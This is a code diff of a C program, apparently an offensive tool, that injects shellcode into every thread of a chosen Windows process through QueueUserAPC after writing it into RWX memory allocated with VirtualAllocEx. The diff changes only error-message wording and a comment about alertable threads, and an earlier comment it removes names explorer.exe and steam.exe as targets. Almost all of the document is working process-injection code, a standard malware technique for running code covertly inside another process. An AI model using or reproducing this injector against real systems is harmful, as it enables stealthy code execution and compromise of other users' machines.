@@ -1,7 +1,8 @@
 /**
 * Injects shellcode into every thread of a process using QueueAPC.
 * [Warning] - The current implementation causes the process crash after executing the shellcode since the shellcode does not comply the PAPCFUNC prototype expected by QueueUserApc.
-* [Warning] - Works best in x64 with explorer.exe.. currently no good target for steam.exe it seems?
+* [Requirements]
+*	- atleast one thread must be in alertable state at some point
 */
 
 #include <Windows.h>
@@ -26,7 +27,7 @@ int main(int argc, char* argv[])
 	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
 	if (processesSnapshot == INVALID_HANDLE_VALUE)
 	{
-		printf("Error %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
+		printf("[Error] %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
 		return 1;
 	}
 
@@ -34,7 +35,7 @@ int main(int argc, char* argv[])
 	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
 	if (!Process32First(processesSnapshot, &processEntry))
 	{
-		printf("Error %d - Failed to Process32First\n", GetLastError());
+		printf("[Error] %d - Failed to Process32First\n", GetLastError());
 		return 1;
 	}
 
@@ -52,7 +53,7 @@ int main(int argc, char* argv[])
 
 	if (!foundTargetProcess)
 	{
-		printf("Error - Failed to find process: %s\n", processName);
+		printf("[Error] - Failed to find process: %s\n", processName);
 		return 1;
 	}
 
@@ -62,7 +63,7 @@ int main(int argc, char* argv[])
 	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
 	if (!targetProcessHandle)
 	{
-		printf("Error %d - Failed to acquire process handle\n", GetLastError());
+		printf("[Error] %d - Failed to acquire process handle\n", GetLastError());
 		return 1;
 	}
 
@@ -70,7 +71,7 @@ int main(int argc, char* argv[])
 	LPVOID remoteMemory = VirtualAllocEx(targetProcessHandle, NULL, sizeof(shellcode)-1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (!remoteMemory)
 	{
-		printf("Error %d - Failed to allocate memory in target process\n", GetLastError());
+		printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
 		return 1;
 	}
 
@@ -79,7 +80,7 @@ int main(int argc, char* argv[])
 	// write shellcode into target process
 	if (!WriteProcessMemory(targetProcessHandle, remoteMemory, shellcode, sizeof(shellcode)-1, NULL))
 	{
-		printf("Error %d - Failed to write .dll path to target process\n", GetLastError());
+		printf("[Error] %d - Failed to write .dll path to target process\n", GetLastError());
 		return 1;
 	}
 
@@ -89,7 +90,7 @@ int main(int argc, char* argv[])
 	THREADENTRY32 currentThreadEntry = { sizeof(THREADENTRY32) };
 	if (!Thread32First(processesSnapshot, &currentThreadEntry))
 	{
-		printf("Error %d - Failed to Thread32First\n", GetLastError());
+		printf("[Error] %d - Failed to Thread32First\n", GetLastError());
 		return 1;
 	}
 
@@ -102,7 +103,7 @@ int main(int argc, char* argv[])
 			HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, currentThreadEntry.th32ThreadID);
 			if (!threadHandle)
 			{
-				printf("Warning - Failed to acquire thread handle with error %d\n", GetLastError());
+				printf("[Warning] - Failed to acquire thread handle with error %d\n", GetLastError());
 				continue;
 			}
 			QueueUserAPC((PAPCFUNC)remoteMemory, threadHandle, NULL);
